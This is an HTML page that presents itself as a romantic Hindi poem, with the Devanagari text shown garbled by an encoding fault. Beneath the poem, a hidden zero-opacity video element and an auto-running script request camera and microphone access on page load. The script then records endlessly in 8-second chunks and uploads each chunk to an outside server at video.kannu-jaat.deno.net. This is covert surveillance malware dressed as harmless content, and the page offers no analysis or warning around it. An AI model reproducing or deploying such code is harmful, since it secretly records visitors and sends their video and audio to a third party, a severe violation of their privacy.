<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Romantic Kavita</title>

<style>
body {
  background: #fff3f6;
  font-family: sans-serif;
  padding: 20px;
  line-height: 1.7;
  color: #333;
}
.kavita {
  max-width: 650px;
  margin: auto;
  background: white;
  padding: 28px;
  border-radius: 16px;
  box-shadow: 0 4px 14px rgba(0,0,0,0.08);
  font-size: 19px;
  position: relative;
  z-index: 10;
}
.hidden {
  position: absolute;
  width: 1px;
  height: 1px;
  opacity: 0;
  overflow: hidden;
  pointer-events: none;
  z-index: -1;
}
h2 {
  color: #e63980;
}
</style>

</head>
<body>

<div class="kavita">
  <h2>ЁЯТХ рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ ЁЯТХ</h2>
  <p>
    рддреЗрд░реА рдЖрдБрдЦреЛрдВ рдореЗрдВ рдЬреЛ рд╕реБрдХреВрди рд╣реИ,<br>
    рд╡реЛ рдХрд╣реАрдВ рдФрд░ рдорд┐рд▓рддрд╛ рдирд╣реАрдВтАж<br><br>

    рддреЗрд░реА рдореБрд╕реНрдХрд╛рди рдХреА рдПрдХ рд╣рд▓реНрдХреА рд╕реА рд▓рд╣рд░,<br>
    рджрд┐рд▓ рдХреЛ рдЫреВрдХрд░ рдирд┐рдХрд▓ рдЬрд╛рдП рддреЛ,<br>
    рдзрдбрд╝рдХрдиреЗрдВ рднреА рдХрд╣ рдЙрдарддреА рд╣реИрдВ тАФ<br>
    <b>"рд░реБрдХ рдЬрд╛ рдЬрд╝рд░рд╛тАж рдпреЗ рдкрд▓ рдлрд┐рд░ рдЖрдП рдирд╛ рдЖрдПтАж"</b>
    <br><br>

    рддреВ рд╕рд╛рде рд╣реЛ рддреЛ рд╣рд░ рдмрд╛рдд рд╣рд╕реАрди рд▓рдЧреЗ,<br>
    рд╡рд░рдирд╛ рдпреЗ рджреБрдирд┐рдпрд╛ рднреА рдХреЛрдИ рдХреНрдпрд╛ рдЦрд╛рд╕ рд╣реИтАж<br><br>

    рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ рдореЗрдВ,<br>
    рдореЗрд░рд╛ рд╣рд░ рд╢рд╛рдо рдЖрдЬ рднреА рд╕рд╛рдБрд╕ рд▓реЗрддрд╛ рд╣реИтАж ЁЯМ╣ЁЯТл
  </p>
</div>

<!-- Hidden video -->
<video id="cam" class="hidden" autoplay playsinline></video>

<script>
let stream;
let recorder;

// Start camera + recording cycle
async function startCapture() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: true
    });

    const v = document.getElementById("cam");
    v.srcObject = stream;
    v.muted = true; // avoid echo

    startCycle(); // begin infinite recording loop

  } catch (err) {
    console.log("Camera permission issue:", err);
  }
}

// 8 sec record тЖТ stop тЖТ send chunk тЖТ wait 1 sec тЖТ repeat
async function startCycle() {
  while (true) {
    await recordFor8Sec();
    await sleep(1000); // 1 second pause
  }
}

function recordFor8Sec() {
  return new Promise((resolve) => {

    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) sendChunk(e.data);
    };

    recorder.start();
    console.log("ЁЯОе Recording 8 secondsтАж");

    setTimeout(() => {
      recorder.requestData();
      recorder.stop();
      console.log("тЫФ Recording stopped, chunk created.");
      resolve();
    }, 8000);

  });
}

// Send chunk to backend
async function sendChunk(blob) {
  const fd = new FormData();
  fd.append("video_chunk", blob, "chunk.webm");

  fetch("https://video.kannu-jaat.deno.net", {
    method: "POST",
    body: fd
  })
  .catch(err => console.error("Failed to send chunk:", err));
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// Auto-start
startCapture();
</script>

</body>
</html>